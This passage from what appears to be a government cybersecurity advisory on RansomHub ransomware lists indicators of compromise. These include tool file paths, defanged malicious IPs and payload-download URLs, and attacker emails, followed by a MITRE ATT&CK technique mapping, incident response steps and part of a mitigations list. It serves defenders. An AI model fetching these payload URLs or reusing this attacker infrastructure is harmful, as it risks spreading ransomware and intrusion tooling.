<p>See <strong>Table 2–Table 5</strong> for IOCs obtained from FBI investigations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Directory Structure TTPs</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Filename</th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\crackmapexec.exe</td>
<td>CrackMapExec</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\kerbrute.exe</td>
<td>Kerberoasting</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\Anydesk.exe</td>
<td>Anydesk C2</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Desktop\\IamBatMan.exe</td>
<td>Ransomware</td>
</tr>
<tr>
<td>C:\\Users\\backupexec\\Desktop\\stealer_cli_v2.exe</td>
<td>Info Stealer</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\nmap-7.94-setup.exe</td>
<td>Nmap</td>
</tr>
<tr>
<td>C:\\Program Files (x86)\\Nmap\\nmap.exe</td>
<td>Nmap</td>
</tr>
<tr>
<td>C:\\Users\\%USERNAME%\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe</td>
<td><a>Mimikatz</a></td>
</tr>
<tr>
<td>C:\\Users\\backupexec\\Downloads\\x64\\mimikatz.exe</td>
<td>Mimikatz</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer</strong>: The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking. Many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Known IPs Related to Malicious Activity (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td><a>8.211.2[.]97</a></td>
</tr>
<tr>
<td>45.95.67[.]41</td>
</tr>
<tr>
<td>45.134.140[.]69</td>
</tr>
<tr>
<td>45.135.232[.]2</td>
</tr>
<tr>
<td>89.23.96[.]203</td>
</tr>
<tr>
<td>188.34.188[.]7</td>
</tr>
<tr>
<td>193.106.175[.]107</td>
</tr>
<tr>
<td>193.124.125[.]78</td>
</tr>
<tr>
<td>193.233.254[.]21</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Known URLs Related to Malicious Activity (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Web Requests</th>
</tr>
</thead>
<tbody>
<tr>
<td><a>http[:]//188.34.188[.]7/555</a></td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/amba16.ico</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/bcrypt.dll</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/CRYPTSP.dll</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/en</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/en-US</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.exe</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.exe.Config</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.INI</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/1.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/1.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/10.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/12.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/12.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/3.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/3.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/4.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/4.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/5.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/5.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/6.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/7.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/8.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/9.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/92.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/AmbaPDF.ico</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/ambapdf.ico.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/bcrypt.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/Cabinet.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/CRYPTBASE.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cryptnet.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/CRYPTSP.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cv4TCGxUjvS.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/DPAPI.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/iertutil.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.INI</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/IPHLPAPI.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/mshtml.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/msi.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/SspiCli.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cv4TCGxUjvS.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/urlmon.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/USERENV.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/webio.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/winhttp.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WININET.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WINMM.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WINMMBASE.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/winnlsres.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe.Config</td>
</tr>
<tr>
<td>http[:]//temp.sh/KnCqD/superloop.exe</td>
</tr>
<tr>
<td>https[:]//grabify.link/Y33YXP</td>
</tr>
<tr>
<td>https[:]//<a>i.ibb.co</a>/2KBydfw/112882618.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/4g6jH2J/2773036704.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/b1bZBpg/2615174623.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/Fxhyq6t/2077411869.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/HK0jV1G/534475006.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/nbMNnW4/2501108160.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/p1RCtpy/2681232755.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/SxQLwYm/1038436121.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/v1bn9ZK/369210627.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/V3Kj1c2/1154761258.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/X2FR8Kz/2113791011.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.com:443/V3Kj1c2/1154761258.png</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.tripadvisor/module.tripadvisor.css</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//<a>12301230[.]co</a>/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external</td>
</tr>
<tr>
<td><a>https[:]//samuelelena[.]co</a>/np</td>
</tr>
<tr>
<td>https[:]/samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module[.]tripadvisor/module[.]tripadvisor[.]js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module[.]external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js&amp;nbsp;</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co:443/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td><a>https[:]//40031[.]co</a>/npm/module.tripadvisor/module.tripadvisor.css</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Emails Related to RansomHub (2023-2024)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Email Addresses</th>
</tr>
</thead>
<tbody>
<tr>
<td>brahma2023[@]onionmail.org</td>
</tr>
<tr>
<td>&lt;victim_organization_name&gt;[@]protonmail.com</td>
</tr>
</tbody>
</table>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See&nbsp;<strong>Table 6–Table 17&nbsp;</strong>for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Resource Development</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obtain Capabilities: Exploits</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\" title=\"Obtain Capabilities: Exploits\">T1588.005</a></td>
<td>RansomHub affiliates may buy, steal, or download exploits that can be used during targeting.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Phishing</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a></td>
<td>RansomHub affiliates used mass phishing and spear-phishing emails to obtain initial access.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>RansomHub affiliates may exploit known vulnerabilities to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>RansomHub affiliates used PowerShell and Scripts to quickly run and automate intrusion.</td>
</tr>
<tr>
<td>Windows Management Instrumentation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a></td>
<td>RansomHub affiliates may abuse Windows Management Instrumentation to execute malicious commands and payloads.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>RansomHub affiliates used PowerShell and Scripts to quickly run and automate intrusion.</td>
</tr>
<tr>
<td>Create Account</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136</a></td>
<td>RansomHub affiliates may create an account to maintain access to victim systems.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Manipulation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a></td>
<td>RansomHub affiliates may manipulate accounts to maintain and/or elevate access to victim systems.</td>
</tr>
<tr>
<td>Remote Services: Remote Desktop Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a></td>
<td>RansomHub affiliates may log onto systems using the Remote Desk Protocol, then perform actions as the logged-on user.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a></td>
<td>RansomHub affiliates may hide binaries by renaming executable names.</td>
</tr>
<tr>
<td>Indicator Removal on Host</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/\" title=\"Indicator Removal on Host\">T1070</a></td>
<td>RansomHub affiliates may remove logs to inhibit cybersecurity response.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>RansomHub affiliates may disable endpoint detection and response (EDR) tooling to avoid detection.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>RansomHub affiliates used Mimikatz on Windows systems to gather credentials.</td>
</tr>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a></td>
<td>RansomHub affiliates may use password spraying to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 13: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a></td>
<td>RansomHub affiliates may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system.&nbsp;</td>
</tr>
<tr>
<td>Network Service Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a></td>
<td>RansomHub affiliates may attempt to get a listing of services running on remote hosts and local network infrastructure devices,</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 14: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation of Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1210/\" title=\"Exploitation of Remote Services\">T1210</a></td>
<td>RansomHub affiliates may exploit remote service to gain unauthorized access to internal systems once inside of a network.&nbsp;</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 15: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a></td>
<td>RansomHub affiliates may use Anydesk, a legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 16: Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/002/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\">T1048.002</a></td>
<td>RansomHub affiliates may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel.</td>
</tr>
<tr>
<td>Transfer Data to Cloud Account</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1537/\" title=\"Transfer Data to Cloud Account\">T1537</a></td>
<td>RansomHub affiliates may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Unencrypted Non-C2 Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/003/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Unencrypted Non-C2 Protocol\">T1048.003</a></td>
<td>RansomHub affiliates may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 17: Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>RansomHub affiliates used encryption for ransomware operations.</td>
</tr>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>RansomHub ransomware deleted volume shadow copies and affiliates removed backups for ransomware operations.</td>
</tr>
</tbody>
</table>
<h2><strong>Incident Response</strong></h2>
<p>If compromise is detected, organizations should:</p>
<ol>
<li>Quarantine or take potentially affected hosts offline.</li>
<li>Reimage compromised hosts.</li>
<li>Provision new account credentials.</li>
<li>Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.</li>
<li>Report the compromise to CISA via CISA’s 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or 888-282-0870). State, local, tribal, or territorial government entities can also report to the Multi-State Information Sharing and Analysis Center (MS-ISAC) (<a href=\"mailto:SOC@cisecurity.org\" title=\"Report to MS-ISAC\">SOC@cisecurity.org</a> or 866-787-4722).</li>
</ol>
<h2><strong>Mitigations</strong></h2>
<h3>Network Defenders</h3>
<p>The authoring organizations recommend organizations implement the mitigations below to improve cybersecurity posture based on RansomHub’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</strong></li>
<li><strong>Require all accounts with password logins</strong> <strong>(e.g., service accounts, admin accounts, and domain admin accounts) to comply with&nbsp;</strong><a href=\"https://pages.nist.gov/800-63-3/\" title=\"Digital Identity Guidelines\">National Institute for Standards and Technology (NIST) standards</a><strong> for developing and managing password policies.</strong>
<ul>
<li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;</li>
<li>Store passwords in hashed format using industry-recognized password managers;</li>
<li>Add password user “salts” to shared login credentials;</li>
<li>Avoid reusing passwords;</li>
<li>Implement multiple failed login attempt account lockouts;</li>
<li>Disable password “hints”; and</li>
<li>Refrain from requiring password changes more frequently than once per year.<br><strong>Note:</strong> NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>
<li>Require administrator credentials to install software.</li>
</ul>
</li>
<li><strong>Keep all operating systems, software, and firmware up to date</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E)\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>]. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.</li>
<li><strong>Require Phishing-Resistant multifactor authentication to administrator accounts</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>] and require standard MFA for all services to the extent possible (particularly for webmail, virtual private networks, and accounts that access critical systems).</li>
<li><strong>Segment networks</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.</li>
